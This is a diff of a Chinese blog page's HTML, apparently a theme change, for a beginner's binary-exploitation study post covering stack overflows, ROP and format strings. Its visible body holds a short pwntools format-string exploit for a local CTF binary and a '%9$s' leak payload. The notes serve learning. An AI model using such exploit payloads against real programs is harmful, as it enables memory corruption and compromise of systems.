@@ -1,337 +1,117 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
+
+
+<html lang="en">
+
+
 <head>
-  <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
-<meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 4.2.1">
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
-  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta charset="utf-8" />
+    
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <title>
+    PWN学习 |  Pz1o
+  </title>
+  <meta name="generator" content="hexo-theme-ayer">
+  
+  <link rel="shortcut icon" href="/favicon.ico" />
+  
+  
+<link rel="stylesheet" href="/dist/main.css">
 
-<link rel="stylesheet" href="/css/main.css">
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css">
 
+  
+<link rel="stylesheet" href="/css/custom.css">
 
-<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  
+  
+<script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
 
-<script id="hexo-configurations">
-    var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
-  </script>
-
-  <meta name="description" content="PWN纯零基础，大佬请略过">
-<meta property="og:type" content="article">
-<meta property="og:title" content="PWN学习">
-<meta property="og:url" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/index.html">
-<meta property="og:site_name" content="Pz1o&#39;s blog">
-<meta property="og:description" content="PWN纯零基础，大佬请略过">
-<meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/1603543652982.jpeg">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201024233545234.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201027230103100.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201027230424200.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028164523021.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028164758641.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028165455072.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028170244054.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028171316681.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028175015154.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028175324930.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028175515114.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028180055683.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028180509024.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028181509843.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028182158445.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028182509458.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028182719496.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028183231684.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028183244082.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028183715008.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028210304426.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028210843823.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028212002026.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028212037049.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028212448211.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028212603675.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028213307651.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028213458423.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028213648493.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028213849813.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028215303342.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201029211445528.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028215837467.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028220533860.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201029210250310.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201103230658840.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201103232118467.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201103231611494.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201111165405311.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201111170622828.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201112200053036.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201112201440668.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201105154134220.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201105160249721.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201105191117470.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201105192140397.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201105193656915.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201105200045153.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201115233600880.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201116194218608.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201106223140061.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201106232428225.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201106233935531.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201103231211223.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201103231430738.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201117163123759.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201117165305864.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201117165321403.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201117203103431.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201117213226675.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201118152914484.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201118173315748.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201118223608385.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201118224006678.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201118230656646.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119110607276.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201118233221511.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119105945419.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119110352335.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119110501531.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119114224011.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119162311702.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119115539452.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119162151833.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163702351.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119120748019.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/1.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163039733.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163232880.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163209378.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163319068.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163433718.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163457182.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119115142092.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163935171.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201107232027030.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201112215451308.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201113183137009.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201113202023659.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201113202640601.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201116200344612.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201117174620932.png">
-<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201117174719721.png">
-<meta property="article:published_time" content="2020-10-24T14:32:31.000Z">
-<meta property="article:modified_time" content="2020-11-19T12:27:05.811Z">
-<meta property="article:author" content="Pz1o">
-<meta property="article:tag" content="PWN">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/1603543652982.jpeg">
-
-<link rel="canonical" href="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/">
-
-
-<script id="page-configurations">
-  // https://hexo.io/docs/variables.html
-  CONFIG.page = {
-    sidebar: "",
-    isHome : false,
-    isPost : true,
-    lang   : 'zh-CN'
-  };
-</script>
-
-  <title>PWN学习 | Pz1o's blog</title>
+  
   
 
+  
 
-
-
-
-
-  <noscript>
-  <style>
-  .use-motion .brand,
-  .use-motion .menu-item,
-  .sidebar-inner,
-  .use-motion .post-block,
-  .use-motion .pagination,
-  .use-motion .comments,
-  .use-motion .post-header,
-  .use-motion .post-body,
-  .use-motion .collection-header { opacity: initial; }
-
-  .use-motion .site-title,
-  .use-motion .site-subtitle {
-    opacity: initial;
-    top: initial;
-  }
-
-  .use-motion .logo-line-before i { left: initial; }
-  .use-motion .logo-line-after i { right: initial; }
-  </style>
-</noscript>
-
+<link rel="alternate" href="/atom.xml" title="Pz1o" type="application/atom+xml">
 </head>
 
-<body itemscope itemtype="http://schema.org/WebPage">
-  <div class="container use-motion">
-    <div class="headband"></div>
+</html>
 
-    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-container">
-  <div class="site-nav-toggle">
-    <div class="toggle" aria-label="切换导航栏">
-      <span class="toggle-line toggle-line-first"></span>
-      <span class="toggle-line toggle-line-middle"></span>
-      <span class="toggle-line toggle-line-last"></span>
-    </div>
-  </div>
-
-  <div class="site-meta">
-
-    <a href="/" class="brand" rel="start">
-      <span class="logo-line-before"><i></i></span>
-      <h1 class="site-title">Pz1o's blog</h1>
-      <span class="logo-line-after"><i></i></span>
-    </a>
-  </div>
-
-  <div class="site-nav-right">
-    <div class="toggle popup-trigger">
-    </div>
-  </div>
-</div>
-
-
-
-
-<nav class="site-nav">
-  <ul id="menu" class="main-menu menu">
-        <li class="menu-item menu-item-home">
-
-    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
-
-  </li>
-        <li class="menu-item menu-item-tags">
-
-    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
-
-  </li>
-        <li class="menu-item menu-item-categories">
-
-    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
-
-  </li>
-        <li class="menu-item menu-item-archives">
-
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
-
-  </li>
-  </ul>
-</nav>
-
-
-
-
-</div>
-    </header>
-
+<body>
+  <div id="app">
     
-  <div class="back-to-top">
-    <i class="fa fa-arrow-up"></i>
-    <span>0%</span>
-  </div>
-
-
-    <main class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          
-
-          <div class="content post posts-expand">
-            
-
-    
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/timg.jpeg">
-      <meta itemprop="name" content="Pz1o">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Pz1o's blog">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          PWN学习
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2020-10-24 22:32:31" itemprop="dateCreated datePublished" datetime="2020-10-24T22:32:31+08:00">2020-10-24</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-11-19 20:27:05" itemprop="dateModified" datetime="2020-11-19T20:27:05+08:00">2020-11-19</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
-                </span>
-            </span>
-
-          
-            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-eye"></i>
-              </span>
-              <span class="post-meta-item-text">阅读次数：</span>
-              <span id="busuanzi_value_page_pv"></span>
-            </span>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>7.5k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>7 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
+      <canvas class="fireworks"></canvas>
+      <style>
+        .fireworks {
+          position: fixed;
+          left: 0;
+          top: 0;
+          z-index: 99999;
+          pointer-events: none;
+        }
+      </style>
       
-        <h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><p>纯零基础，大佬请略过</p>
-<a id="more"></a>
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-PWN学习"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  PWN学习
+</h1>
+ 
+
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/" class="article-date">
+  <time datetime="2020-10-24T14:32:31.000Z" itemprop="datePublished">2020-10-24</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/PWN/">PWN</a>
+  </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> Word count:</span>
+            <span class="post-count">2.2k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> Reading time≈</span>
+            <span class="post-count">10 min</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <a id="more"></a>
+<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><p>纯零基础，大佬请略过</p>
 <p>从零开始学习PWN,Web会去学，但可能现在大部分时间会用在PWN上，如果需要题的话可以评论</p>
 <p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/1603543652982.jpeg" alt="1603543652982"></p>
 <p>大学中是研究深度还是广度，我可能还是需要选择一下</p>
@@ -515,276 +295,570 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">conn=process(<span class="string">'./fmtstr1'</span>)</span><br><span class="line">e=ELF(<span class="string">'./fmtstr1'</span>)</span><br><span class="line">x_addr=<span class="number">0x0804A02C</span>                                      </span><br><span class="line">payload=p32(x_addr) + <span class="string">b"%11$n"</span></span><br><span class="line">conn.sendline(payload)</span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure>
 <h3 id="fmstr2"><a href="#fmstr2" class="headerlink" title="fmstr2"></a>fmstr2</h3><p>这题很奇怪 X64  感觉是爆破出来的</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%9$s</span><br></pre></td></tr></table></figure>
-
+ 
+      <!-- reward -->
+      
     </div>
-
     
+
+    <!-- copyright -->
     
-    
-        
-
-<div>
-<ul class="post-copyright">
-  <li class="post-copyright-author">
-    <strong>本文作者： </strong>Pz1o
-  </li>
-  <li class="post-copyright-link">
-    <strong>本文链接：</strong>
-    <a href="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/" title="PWN学习">http://yoursite.com/2020/10/24/PWN学习/</a>
-  </li>
-  <li class="post-copyright-license">
-    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
-  </li>
-</ul>
-</div>
-
-
-      <footer class="post-footer">
-          <div class="post-tags">
-              <a href="/tags/PWN/" rel="tag"># PWN</a>
-          </div>
-
-        
-
-
-        
-    <div class="post-nav">
-      <div class="post-nav-item">
-    <a href="/2020/10/24/CUMT2020%E5%8D%8E%E4%B8%BA%E6%9D%AF/" rel="prev" title="CUMT2020华为杯">
-      <i class="fa fa-chevron-left"></i> CUMT2020华为杯
-    </a></div>
-      <div class="post-nav-item">
-    <a href="/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/" rel="next" title="逆向工程核心原理读书笔记">
-      逆向工程核心原理读书笔记 <i class="fa fa-chevron-right"></i>
-    </a></div>
-    </div>
-      </footer>
-    
-  </article>
-  
-  
-  
-
-
-
-          </div>
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>Copyright： </strong>
           
-    <div class="comments" id="gitalk-container"></div>
-
-<script>
-  window.addEventListener('tabs:register', () => {
-    let { activeClass } = CONFIG.comments;
-    if (CONFIG.comments.storage) {
-      activeClass = localStorage.getItem('comments_active') || activeClass;
-    }
-    if (activeClass) {
-      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
-      if (activeTab) {
-        activeTab.click();
-      }
-    }
-  });
-  if (CONFIG.comments.storage) {
-    window.addEventListener('tabs:click', event => {
-      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
-      let commentClass = event.target.classList[1];
-      localStorage.setItem('comments_active', commentClass);
-    });
-  }
-</script>
-
-        </div>
+          Copyright is owned by the author. For commercial reprints, please contact the author for authorization. For non-commercial reprints, please indicate the source.
           
-  
-  <div class="toggle sidebar-toggle">
-    <span class="toggle-line toggle-line-first"></span>
-    <span class="toggle-line toggle-line-middle"></span>
-    <span class="toggle-line toggle-line-last"></span>
-  </div>
-
-  <aside class="sidebar">
-    <div class="sidebar-inner">
-
-      <ul class="sidebar-nav motion-element">
-        <li class="sidebar-nav-toc">
-          文章目录
-        </li>
-        <li class="sidebar-nav-overview">
-          站点概览
         </li>
       </ul>
-
-      <!--noindex-->
-      <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#PWN"><span class="nav-number">1.</span> <span class="nav-text">PWN</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#基础"><span class="nav-number">2.</span> <span class="nav-text">基础</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ELF文件"><span class="nav-number">2.1.</span> <span class="nav-text">ELF文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#虚拟内存"><span class="nav-number">2.2.</span> <span class="nav-text">虚拟内存</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#程序编译与链接"><span class="nav-number">2.3.</span> <span class="nav-text">程序编译与链接</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#程序装载与进程执行"><span class="nav-number">2.4.</span> <span class="nav-text">程序装载与进程执行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#汇编指令"><span class="nav-number">2.5.</span> <span class="nav-text">汇编指令</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#栈溢出基础"><span class="nav-number">3.</span> <span class="nav-text">栈溢出基础</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#基本原理"><span class="nav-number">3.1.</span> <span class="nav-text">基本原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#实例"><span class="nav-number">3.2.</span> <span class="nav-text">实例</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#攻击"><span class="nav-number">3.3.</span> <span class="nav-text">攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ret2text"><span class="nav-number">3.3.1.</span> <span class="nav-text">ret2text</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ret2shellcode"><span class="nav-number">3.3.2.</span> <span class="nav-text">ret2shellcode</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ret2libc"><span class="nav-number">3.3.3.</span> <span class="nav-text">ret2libc</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#返回导向编程"><span class="nav-number">4.</span> <span class="nav-text">返回导向编程</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#基础-1"><span class="nav-number">4.1.</span> <span class="nav-text">基础</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#攻击-1"><span class="nav-number">4.2.</span> <span class="nav-text">攻击</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#x64"><span class="nav-number">4.3.</span> <span class="nav-text">x64</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#动态链接过程"><span class="nav-number">5.</span> <span class="nav-text">动态链接过程</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#保护措施"><span class="nav-number">6.</span> <span class="nav-text">保护措施</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#RELRO"><span class="nav-number">6.1.</span> <span class="nav-text">RELRO</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#The-NX-bits"><span class="nav-number">6.2.</span> <span class="nav-text">The NX bits</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ASLR"><span class="nav-number">6.3.</span> <span class="nav-text">ASLR</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Canary"><span class="nav-number">6.4.</span> <span class="nav-text">Canary</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PIE"><span class="nav-number">6.5.</span> <span class="nav-text">PIE</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#栈迁移"><span class="nav-number">7.</span> <span class="nav-text">栈迁移</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#格式化字符串漏洞"><span class="nav-number">8.</span> <span 